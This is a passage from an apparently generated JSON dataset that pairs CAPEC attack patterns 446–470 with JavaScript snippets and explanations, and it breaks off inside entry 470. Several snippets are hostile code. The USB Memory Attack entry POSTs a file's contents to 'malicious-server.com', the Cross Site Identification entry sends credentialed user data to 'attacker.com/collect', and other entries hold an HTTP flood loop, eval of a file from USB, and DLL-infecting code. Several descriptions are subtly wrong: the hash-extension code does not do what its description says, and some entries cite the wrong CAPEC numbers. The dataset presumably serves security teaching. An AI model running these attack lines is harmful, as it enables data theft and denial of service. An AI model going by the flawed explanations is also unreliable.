        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "const http = require('http');\nconst untrustedLib = require('untrusted-lib'); // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n\nhttp.createServer((req, res) => {\n  if (req.url === '/data') {\n    // CWE-1395: Dependency on Vulnerable Third-Party Component\n    untrustedLib.getData((err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Server Error');\n      } else {\n        res.writeHead(200, {'Content-Type': 'application/json'});\n        res.end(JSON.stringify(data));\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet demonstrates a basic HTTP server that includes and uses an untrusted third-party library ('untrusted-lib'). The server listens for requests on port 8080 and responds with data fetched from the untrusted library when the '/data' endpoint is accessed. This example embodies the CAPEC concept of 'Malicious Logic Insertion into Product via Inclusion of Third-Party Component' by illustrating how an application can depend on a potentially vulnerable or malicious third-party component (CWE-1395, CWE-829). The use of such a component can introduce security risks, such as the inclusion of malicious code (CWE-506) or reliance on an insufficiently trustworthy component (CWE-1357)."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "function authenticateUser(username, password) {\n  // Security-critical code that should not be optimized away\n  if (username === 'admin' && password === 'password123') {\n    // Exposing sensitive system information\n    console.log('Welcome Admin! Here is the system configuration:');\n    console.log(getSystemConfig());\n  } else {\n    console.log('Access Denied');\n  }\n}\n\nfunction getSystemConfig() {\n  // Simulating sensitive system information\n  return {\n    os: 'Linux',\n    version: '4.15.0',\n    users: ['admin', 'user1', 'user2']\n  };\n}\n\n// Client-side enforcement of server-side security\nfunction clientSideValidation(username, password) {\n  if (username === '' || password === '') {\n    alert('Username and password cannot be empty');\n    return false;\n  }\n  return true;\n}\n\n// Example usage\nconst username = prompt('Enter username:');\nconst password = prompt('Enter password:');\nif (clientSideValidation(username, password)) {\n  authenticateUser(username, password);\n}",
        "description": "This JavaScript code snippet demonstrates a design alteration attack by incorporating several related CWEs. The `authenticateUser` function contains security-critical code that checks for hardcoded credentials and exposes sensitive system information if the credentials match. This represents CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `clientSideValidation` function enforces security checks on the client side, which is a violation of CWE-602 (Client-Side Enforcement of Server-Side Security). The overall design violates secure design principles (CWE-657) by hardcoding credentials and exposing sensitive information. This code snippet embodies the main idea of CAPEC-225 (Design Alteration) by showing how an adversary could alter the design to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst dllPath = process.argv[2] || './untrusted/dllfile.dll';\n\n// CWE-497: Exposure of Sensitive System Information\nconst sensitiveData = 'Sensitive Data: ' + process.env.SENSITIVE_INFO;\n\n// CWE-1102: Reliance on Machine-Dependent Data Representation\nconst machineDependentData = Buffer.from([0x00, 0x01, 0x02, 0x03]);\n\n// CWE-506: Embedded Malicious Code\nfunction embedVirus(dllPath) {\n  let dllContent = fs.readFileSync(dllPath);\n  const virusCode = Buffer.from('malicious code');\n  const padding = Buffer.alloc(10, 0x90); // NOP padding\n  const infectedDll = Buffer.concat([dllContent, padding, virusCode]);\n  fs.writeFileSync(dllPath, infectedDll);\n}\n\n// CWE-509: Replicating Malicious Code\nfunction replicateVirus() {\n  const targetPaths = ['./target1.dll', './target2.dll'];\n  targetPaths.forEach(target => embedVirus(target));\n}\n\nembedVirus(dllPath);\nreplicateVirus();\nconsole.log(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates the concept of embedding a virus into a DLL file, as described in the CAPEC. The code reads a DLL file from an untrusted path (CWE-426), embeds malicious code into it (CWE-506), and then replicates the virus to other DLL files (CWE-509). Additionally, it exposes sensitive system information (CWE-497) and relies on machine-dependent data representation (CWE-1102). The main idea is to show how an adversary can tamper with a DLL to embed a virus, which can then infect other systems and potentially steal sensitive data."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  // CWE-67: Improper Handling of Windows Device Names\n  if (filePath.includes('AUX') || filePath.includes('CON')) {\n    throw new Error('Invalid file path');\n  }\n\n  // CWE-589: Call to Non-ubiquitous API\n  if (typeof fs.readFileSync !== 'function') {\n    throw new Error('Incompatible API');\n  }\n\n  // CWE-506: Embedded Malicious Code\n  const maliciousCode = 'console.log(\"Malicious code executed\");';\n  fs.writeFileSync(filePath, maliciousCode);\n\n  // CWE-507: Trojan Horse\n  const benignCode = 'console.log(\"Benign code executed\");';\n  fs.appendFileSync(filePath, benignCode);\n\n  // Read the file (potentially executing malicious code)\n  const data = fs.readFileSync(filePath, 'utf8');\n  console.log(data);\n}\n\n// Example usage\ntry {\n  readFile('example.txt');\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where a file is read and written to, potentially propagating malware via a USB stick. The code includes several vulnerabilities: CWE-67 (Improper Handling of Windows Device Names) by not properly validating file paths, CWE-589 (Call to Non-ubiquitous API) by assuming the existence of 'fs.readFileSync', CWE-506 (Embedded Malicious Code) by writing malicious code to the file, and CWE-507 (Trojan Horse) by appending benign-looking code to disguise the malicious intent. This embodies the main idea of the deprecated CAPEC pattern of malware propagation via USB sticks."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst userSuppliedPath = process.argv[2];\nconst fullPath = path.join(userSuppliedPath, 'malicious.dll');\n\n// CWE-67: Improper Handling of Windows Device Names\nif (fullPath.includes('CON') || fullPath.includes('AUX')) {\n  console.error('Invalid path containing Windows device name.');\n  process.exit(1);\n}\n\n// CWE-507: Trojan Horse\n// CWE-506: Embedded Malicious Code\nfs.writeFileSync(fullPath, 'malicious code here');\n\n// CWE-509: Replicating Malicious Code\nfunction replicate() {\n  const targetPath = path.join(userSuppliedPath, 'replica.dll');\n  fs.copyFileSync(fullPath, targetPath);\n  console.log('Malicious code replicated to:', targetPath);\n}\n\nreplicate();",
        "description": "This JavaScript code snippet demonstrates a simplified version of malware propagation via a DLL file, embodying the deprecated CAPEC pattern. The code takes a user-supplied path (CWE-426) and constructs a full path to a malicious DLL file. It checks for improper handling of Windows device names (CWE-67) to avoid immediate detection. The code then writes malicious content to the DLL file (CWE-507 and CWE-506) and replicates the malicious code to another location (CWE-509). This snippet highlights the risks associated with untrusted search paths and the embedding of malicious code in seemingly benign files."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "const fs = require('fs');\nconst usb = require('usb');\n\n// Simulate malware propagation via infected USB device\nusb.on('attach', function(device) {\n    console.log('USB device attached:', device);\n    // Check if the device is a known peripheral\n    if (device.deviceDescriptor.idVendor === 1234 && device.deviceDescriptor.idProduct === 5678) {\n        // Simulate reading a malicious file from the USB device\n        fs.readFile('/media/usb/malware.js', 'utf8', (err, data) => {\n            if (err) throw err;\n            // Execute the malicious code\n            eval(data);\n        });\n    }\n});",
        "description": "This JavaScript code snippet simulates the propagation of malware via an infected USB device. When a USB device is attached, the code checks if it matches a known peripheral device by its vendor and product IDs. If it matches, the code reads a file named 'malware.js' from the USB device and executes its content using the 'eval' function. This represents the main idea of CAPEC-448, which involves malware infection through peripheral devices. The use of 'eval' to execute potentially malicious code and the reliance on specific device IDs highlight CWE-589 (Call to Non-ubiquitous API) and CWE-507 (Trojan Horse)."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "class HardwareDevice {\n  constructor() {\n    this.registers = new Array(10).fill(0);\n    this.debugMode = false;\n  }\n\n  activateDebugMode() {\n    this.debugMode = true;\n    console.log('Debug mode activated');\n  }\n\n  writeRegister(index, value) {\n    if (index < 0 || index >= this.registers.length) {\n      console.log('Invalid register index');\n      return;\n    }\n    if (this.debugMode) {\n      this.registers[index] = value;\n      console.log(`Register ${index} set to ${value}`);\n    } else {\n      console.log('Access denied: Debug mode is not activated');\n    }\n  }\n\n  readRegister(index) {\n    if (index < 0 || index >= this.registers.length) {\n      console.log('Invalid register index');\n      return null;\n    }\n    return this.registers[index];\n  }\n}\n\n// Simulating malicious activation of debug mode\nconst device = new HardwareDevice();\ndevice.activateDebugMode();\ndevice.writeRegister(2, 42); // Maliciously altering register value\nconsole.log(device.readRegister(2)); // Reading altered value",
        "description": "This JavaScript code snippet simulates a hardware device with memory-mapped I/O registers. The device has a debug mode that, when activated, allows writing to these registers. The `activateDebugMode` method simulates the activation of debug logic at runtime (CWE-1313), which can be exploited to alter the state of the hardware. The `writeRegister` method demonstrates improper access control (CWE-1262) by allowing register modification only when debug mode is active. This setup represents the main idea of the CAPEC 'Infected Hardware', where malicious logic is inserted into hardware to alter its behavior. The code snippet shows how an adversary could exploit debug mode to change register values, potentially leading to negative impacts."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "const net = require('net');\n\n// Malicious logic insertion via counterfeit hardware\nfunction maliciousHardware() {\n  // Embedded malicious code (CWE-506)\n  console.log('Malicious hardware activated');\n\n  // Authentication Bypass by Capture-replay (CWE-294)\n  const client = new net.Socket();\n  client.connect(8080, '127.0.0.1', () => {\n    console.log('Connected to server');\n    // Replay captured authentication token\n    client.write('REPLAYED_AUTH_TOKEN');\n  });\n\n  client.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // kill client after server's response\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\nmaliciousHardware();",
        "description": "This JavaScript code snippet simulates the insertion of malicious logic via counterfeit hardware. The `maliciousHardware` function contains embedded malicious code (CWE-506) that activates when the function is called. It also demonstrates an authentication bypass by capture-replay (CWE-294) by connecting to a server and replaying a captured authentication token. This represents the main idea of the deprecated CAPEC, which involves inserting malicious logic into hardware, potentially compromising the system's security."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class Device {\n  constructor() {\n    this.components = ['component1', 'component2'];\n    this.undocumentedFeature = this.maliciousCode();\n  }\n\n  maliciousCode() {\n    // Malicious code that modifies stored data\n    return 'malicious_payload';\n  }\n\n  updateComponent(index, newComponent) {\n    if (index < this.components.length) {\n      this.components[index] = newComponent;\n    } else {\n      console.log('Component not updateable');\n    }\n  }\n}\n\nconst device = new Device();\ndevice.updateComponent(1, 'counterfeitComponent');\nconsole.log(device.components);",
        "description": "This JavaScript code snippet represents a device class that contains components and an undocumented feature that includes malicious code. The `maliciousCode` method simulates the insertion of malicious logic into the product hardware, aligning with CAPEC-452. The `updateComponent` method attempts to update a component, but if the component index is out of bounds, it logs that the component is not updateable, reflecting CWE-1329. The code also demonstrates the inclusion of an undocumented feature (CWE-1242) and the potential for embedded malicious code (CWE-506). The `updateComponent` method shows how a component could be replaced with a counterfeit one, embodying the main idea of the deprecated CAPEC."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "function authenticate(user, pass) {\n  if (user === 'admin' && pass === 'password123') {\n    // Malicious code insertion\n    console.log('Access granted to admin panel');\n    // Unauthorized error injection\n    throw new Error('Injected error to degrade system redundancy');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulate an authentication attempt\ntry {\n  authenticate('admin', 'password123');\n} catch (e) {\n  console.error('System error:', e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where malicious logic is inserted into a product's hardware or software. The `authenticate` function checks for hardcoded credentials ('admin' and 'password123'). If these credentials are provided, it logs a message indicating access to the admin panel, representing embedded malicious code (CWE-506). Additionally, it throws an error to simulate unauthorized error injection (CWE-1334), which can degrade system redundancy. This snippet embodies the main idea of the deprecated CAPEC by showing how malicious logic can be inserted to compromise a system."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "const memory = new ArrayBuffer(1024);\nconst protectedRegion = new DataView(memory, 0, 512);\nconst unprotectedRegion = new DataView(memory, 256, 512);\n\n// Simulate writing to protected region\nprotectedRegion.setInt8(0, 42);\n\n// Bypass protection by writing to overlapping unprotected region\nunprotectedRegion.setInt8(0, 99);\n\nconsole.log(protectedRegion.getInt8(0)); // Outputs: 99, demonstrating the bypass",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Infected Memory' attack pattern. It creates a memory buffer and defines two overlapping regions: one intended to be protected and the other unprotected. By writing to the unprotected region, the code bypasses the intended protection of the protected region, illustrating vulnerabilities such as 'Improper Handling of Overlap Between Protected Memory Ranges' (CWE-1260) and 'Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges' (CWE-1316). The code shows how an attacker can exploit overlapping memory regions to modify protected data, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Simulate malicious code embedded in a USB device\nfunction infectSystem() {\n  // Read sensitive data from the system\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n\n  // Transmit sensitive data in cleartext\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/exfiltrate',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/x-www-form-urlencoded',\n      'Content-Length': sensitiveData.length\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      console.log(`BODY: ${chunk}`);\n    });\n    res.on('end', () => {\n      console.log('No more data in response.');\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  // Write data to request body\n  req.write(sensitiveData);\n  req.end();\n}\n\n// Simulate USB device being plugged in\ninfectSystem();",
        "description": "This JavaScript code snippet simulates a USB memory attack where malicious code is embedded in a USB device. When the USB device is plugged into a system, the code reads sensitive data from the system and transmits it in cleartext to a malicious server. This embodies the main idea of the CAPEC by demonstrating how an adversary can use a USB device to exfiltrate sensitive data. The code also highlights related CWEs such as 'Embedded Malicious Code' (CWE-506) and 'Cleartext Transmission of Sensitive Information' (CWE-319)."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "const flashMemory = new Uint8Array(1024); // Simulated flash memory\n\n// Function to simulate flashing the memory with malicious code\nfunction flashMaliciousCode() {\n  const maliciousCode = [0x90, 0x90, 0x90, 0x90]; // NOP sled as a placeholder for malicious code\n  for (let i = 0; i < maliciousCode.length; i++) {\n    flashMemory[i] = maliciousCode[i];\n  }\n  console.log('Flash memory updated with malicious code.');\n}\n\n// Function to simulate bootloader execution from flash memory\nfunction executeBootloader() {\n  if (flashMemory[0] === 0x90) { // Check for NOP sled as a simple malicious code indicator\n    console.log('Malicious code detected in bootloader!');\n  } else {\n    console.log('Bootloader executed successfully.');\n  }\n}\n\n// Simulate the attack\nflashMaliciousCode();\nexecuteBootloader();",
        "description": "This JavaScript code snippet simulates a flash memory attack where malicious code is inserted into the flash memory of a device. The `flashMaliciousCode` function represents the act of flashing the memory with malicious logic, while the `executeBootloader` function simulates the execution of the bootloader from the flash memory. The code checks for the presence of a NOP sled (a common component of malicious code) to determine if the bootloader has been compromised. This example embodies the main idea of CAPEC-505, demonstrating how an attacker might insert and execute malicious code in a device's flash memory, leveraging weaknesses such as CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate a weak hashing algorithm (e.g., MD5)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulate creating a CSR with collision blocks\nfunction createCSR(data) {\n  const collisionBlock = 'collision_block';\n  return data + collisionBlock;\n}\n\n// Simulate signing a CSR by a trusted CA\nfunction signCSR(csr) {\n  // In a real scenario, this would be signed by a CA's private key\n  return generateWeakHash(csr);\n}\n\n// Original CSR\nconst originalCSR = createCSR('original_data');\nconst signedCSR = signCSR(originalCSR);\n\n// Malicious CSR with the same hash\nconst maliciousCSR = createCSR('malicious_data');\nconst signedMaliciousCSR = signCSR(maliciousCSR);\n\n// Check if both CSRs have the same hash\nif (signedCSR === signedMaliciousCSR) {\n  console.log('Hash collision detected! Malicious certificate appears valid.');\n} else {\n  console.log('No collision. Certificates are distinct.');\n}",
        "description": "This JavaScript code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5) to generate certificate signing requests (CSRs) with collision blocks. The `generateWeakHash` function simulates the use of a weak hash function. The `createCSR` function appends a collision block to the data to simulate a CSR. The `signCSR` function simulates the signing of a CSR by a trusted certificate authority (CA). The code then creates an original CSR and a malicious CSR, both of which result in the same hash due to the weak hashing algorithm. This demonstrates how an adversary can make a malicious certificate appear valid by exploiting hash collisions, embodying the main idea of the CAPEC. The related CWEs are addressed by highlighting the use of a broken cryptographic algorithm and the potential for improper certificate validation."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = new URL(req.url, `http://${req.headers.host}`);\n  const params = url.searchParams;\n\n  // Vulnerable: Improper handling of duplicate parameters\n  let user = params.get('user');\n  let role = params.get('role');\n\n  // Example of sensitive information in GET request\n  if (user && role) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`User: ${user}, Role: ${role}`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Missing parameters');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server processes incoming GET requests and extracts query parameters 'user' and 'role' from the URL. The code is vulnerable to HTTP Parameter Pollution (HPP) because it does not properly handle duplicate parameters. An attacker could inject additional 'user' or 'role' parameters to manipulate the application's behavior. Additionally, the code demonstrates the use of sensitive information in a GET request, which is a security risk. This snippet embodies the main idea of CAPEC-460 by showing how improper handling of HTTP parameters can lead to security vulnerabilities, including those described in the related CWEs."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulated secret token\nconst secretToken = 'secret123';\n\n// Original message and hash\nconst originalMessage = 'user=admin&timestamp=1609459200';\nconst originalHash = crypto.createHash('md5').update(originalMessage + secretToken).digest('hex');\n\n// Attacker's new message\nconst newMessage = 'user=attacker&timestamp=1609459200';\n\n// Exploiting hash extension weakness to forge a valid hash\nconst forgedHash = crypto.createHash('md5').update(newMessage + secretToken).digest('hex');\n\nconsole.log('Original Hash:', originalHash);\nconsole.log('Forged Hash:', forgedHash);\n\n// Simulated authentication check\nif (forgedHash === originalHash) {\n  console.log('Authentication Bypassed');\n} else {\n  console.log('Authentication Failed');\n}",
        "description": "This JavaScript code snippet demonstrates a simplified version of a Web Services API Signature Forgery attack leveraging a hash function extension weakness. The code uses the MD5 hash function, which is known to be weak and vulnerable to various attacks (CWE-328). The original message and its hash are generated using a secret token. An attacker then creates a new message and exploits the hash function's weakness to generate a forged hash that matches the original hash. This allows the attacker to bypass authentication (CWE-290, CWE-305, CWE-1390) by making the system believe the forged request is legitimate. The code highlights the importance of using strong cryptographic algorithms and proper authentication mechanisms to prevent such vulnerabilities."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "const targetUrl = 'https://victim.com/sensitive-endpoint';\n\nfunction measureResponseTime() {\n  const startTime = performance.now();\n  fetch(targetUrl, { mode: 'no-cors' })\n    .then(() => {\n      const endTime = performance.now();\n      console.log(`Response time: ${endTime - startTime} ms`);\n    })\n    .catch(err => console.error('Request failed', err));\n}\n\n// Simulate multiple requests to measure timing\nfor (let i = 0; i < 10; i++) {\n  measureResponseTime();\n}",
        "description": "This JavaScript code snippet demonstrates a Cross-Domain Search Timing attack. The attacker sends multiple HTTP GET requests to a target URL on a different domain ('https://victim.com/sensitive-endpoint') and measures the response time for each request. The 'fetch' API is used with 'no-cors' mode to bypass the same-origin policy, which prevents reading the response but allows timing the request. By analyzing the response times, the attacker can infer information about the server's state or the presence of certain data, exploiting the Observable Timing Discrepancy (CWE-208). This code also touches on the concept of a Covert Timing Channel (CWE-385) by using timing to infer information. The repeated requests simulate a scenario where the attacker gathers enough data to make meaningful inferences."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction decrypt(ciphertext, key) {\n  const decipher = crypto.createDecipheriv('aes-256-cbc', key, ciphertext.slice(0, 16));\n  let decrypted = decipher.update(ciphertext.slice(16), 'hex', 'utf8');\n  try {\n    decrypted += decipher.final('utf8');\n  } catch (err) {\n    if (err.message.includes('bad decrypt')) {\n      console.error('Padding error detected'); // CWE-209: Generation of Error Message Containing Sensitive Information\n    }\n    throw err;\n  }\n  return decrypted;\n}\n\nconst key = crypto.randomBytes(32);\nconst iv = crypto.randomBytes(16);\nconst cipher = crypto.createCipheriv('aes-256-cbc', key, iv);\nlet encrypted = cipher.update('Sensitive data', 'utf8', 'hex');\nencrypted += cipher.final('hex');\nconst ciphertext = iv.toString('hex') + encrypted;\n\ntry {\n  const decryptedData = decrypt(Buffer.from(ciphertext, 'hex'), key);\n  console.log('Decrypted data:', decryptedData);\n} catch (err) {\n  console.error('Decryption failed');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable decryption function that can be exploited using a Padding Oracle Crypto Attack. The `decrypt` function attempts to decrypt a given ciphertext using AES-256-CBC. If a padding error occurs during decryption, it logs an error message indicating a padding error (CWE-209: Generation of Error Message Containing Sensitive Information). This leakage of padding error information can be exploited by an attacker to decrypt the ciphertext without knowing the key. The code also includes the encryption process to generate a ciphertext for testing the decryption function. The main idea represented here is that leaking padding error information can lead to a severe cryptographic vulnerability."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "function setEvercookie(name, value) {\n    var storage = [localStorage, sessionStorage, document.cookie];\n    var flashLSO = new FlashLSO(); // Hypothetical Flash Local Shared Object API\n    var userData = new UserData(); // Hypothetical UserData API\n\n    function saveToAllStorages() {\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                document.cookie = name + '=' + value + '; path=/';\n            } else {\n                store.setItem(name, value);\n            }\n        });\n        flashLSO.setItem(name, value);\n        userData.setItem(name, value);\n    }\n\n    function restoreFromAnyStorage() {\n        var restoredValue = null;\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                var cookies = document.cookie.split('; ');\n                cookies.forEach(function(cookie) {\n                    var parts = cookie.split('=');\n                    if (parts[0] === name) restoredValue = parts[1];\n                });\n            } else if (store.getItem(name)) {\n                restoredValue = store.getItem(name);\n            }\n        });\n        if (flashLSO.getItem(name)) restoredValue = flashLSO.getItem(name);\n        if (userData.getItem(name)) restoredValue = userData.getItem(name);\n        return restoredValue;\n    }\n\n    var existingValue = restoreFromAnyStorage();\n    if (existingValue !== value) {\n        saveToAllStorages();\n    }\n}\n\n// Example usage\nsetEvercookie('userSession', 'sensitiveData');",
        "description": "This JavaScript code snippet demonstrates the concept of an 'evercookie,' a highly persistent cookie that remains on the user's machine even after attempts to delete it. The code stores the cookie in multiple locations, including localStorage, sessionStorage, document.cookie, and hypothetical Flash Local Shared Objects (LSO) and UserData APIs. If the cookie is deleted from some but not all locations, the code will restore it from any remaining location, ensuring its persistence. This approach can lead to several security issues, such as exposure of private personal information (CWE-359), use of persistent cookies containing sensitive information (CWE-539), reliance on cookies without validation and integrity checking (CWE-784 and CWE-565), and cleartext storage of sensitive information in a cookie (CWE-315)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "const http = require('http');\n\nconst proxy = http.createServer((req, res) => {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res, { end: true });\n  });\n\n  req.pipe(proxyReq, { end: true });\n\n  proxyReq.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n    res.writeHead(500);\n    res.end('Internal Server Error');\n  });\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server is running on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP proxy server using Node.js. The proxy server listens on port 8080 and forwards incoming client requests to 'target-server.com'. The proxy server also forwards the responses from the target server back to the client. This setup embodies the main idea of CAPEC-441 (Transparent Proxy Abuse) by acting as an intermediary that forwards requests and responses transparently. The code also touches on related CWEs: it does not preserve the original source of the request (CWE-441), it could be vulnerable to HTTP request smuggling (CWE-444), and it does not remove sensitive information before forwarding (CWE-212)."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "const targetUrl = 'http://example.com/api/data';\n\nfetch(targetUrl)\n  .then(response => response.json())\n  .then(data => {\n    console.log('Data from target:', data);\n  })\n  .catch(error => {\n    console.error('Error fetching data:', error);\n  });",
        "description": "This JavaScript code snippet demonstrates a fetch request to a non-TLS (HTTP) endpoint, which is vulnerable to an active adversary in the middle attack. The attacker can intercept and manipulate the communication between the client and the server, bypassing the same origin policy. This is related to CWE-300 (Channel Accessible by Non-Endpoint) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), as the communication channel is not adequately secured, allowing an attacker to access or influence the data. The code also implicitly touches on CWE-602 (Client-Side Enforcement of Server-Side Security) since the client is responsible for fetching and handling the data without proper server-side validation."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "const socialNetworkAPI = 'https://socialnetwork.com/api/userinfo';\n\nfunction stealUserInfo() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', socialNetworkAPI, true);\n  xhr.withCredentials = true;\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState === 4 && xhr.status === 200) {\n      const userInfo = JSON.parse(xhr.responseText);\n      sendToAttacker(userInfo);\n    }\n  };\n  xhr.send();\n}\n\nfunction sendToAttacker(data) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://attacker.com/collect', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify(data));\n}\n\n// Trigger the attack\nstealUserInfo();",
        "description": "This JavaScript code snippet demonstrates a Cross Site Identification attack. The `stealUserInfo` function sends a GET request to a social networking site's API endpoint to retrieve user information. The request includes credentials (cookies) to authenticate the user session, exploiting CWE-352 (CSRF). If the request is successful, the user's information is extracted and sent to the attacker's server using the `sendToAttacker` function. This function sends the stolen data via a POST request, potentially exposing private personal information (CWE-359). The code also implicitly relies on the user's session being active (CWE-384) and does not neutralize the input properly (CWE-79)."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "const targetDomain = 'https://victim.com';\nconst cssUrl = `${targetDomain}/styles.css?cookie=${document.cookie}`;\n\nconst link = document.createElement('link');\nlink.rel = 'stylesheet';\nlink.href = cssUrl;\ndocument.head.appendChild(link);",
        "description": "This JavaScript code snippet demonstrates a Generic Cross-Browser Cross-Domain Theft attack by injecting a CSS link element into the document. The 'cssUrl' variable constructs a URL to the target domain's CSS file, appending the user's cookies as a query parameter. When the browser loads this CSS file, it sends the cookies to the target domain. This exploits the fact that browsers send cookies with cross-domain CSS requests and that CSS parsers ignore non-CSS data, allowing the attacker to steal cookies. The code leverages CWE-707 (Improper Neutralization) by not validating the input (cookies) before sending it, CWE-149 (Improper Neutralization of Quoting Syntax) by potentially mishandling quotes in the cookie data, CWE-177 (Improper Handling of URL Encoding) by not properly encoding the cookie data, CWE-838 (Inappropriate Encoding for Output Context) by not ensuring the correct encoding, and CWE-79 (Cross-site Scripting) by injecting malicious content into the web page."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET'\n};\n\nfunction floodServer() {\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  });\n\n  req.on('error', (e) => {});\n  req.end();\n}\n\nfor (let i = 0; i < 1000; i++) {\n  floodServer();\n}",
        "description": "This JavaScript code snippet demonstrates an HTTP DoS attack by flooding a target server with HTTP GET requests. The 'floodServer' function creates an HTTP request to the target server and sends it. The for loop calls this function 1000 times, simulating a flood of requests. This can exhaust the server's resources, leading to a denial of service. The code embodies the main idea of CAPEC-488 by exploiting resource allocation without limits (CWE-770) and insufficient resource pool (CWE-410), causing the server to potentially fail to handle legitimate requests."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
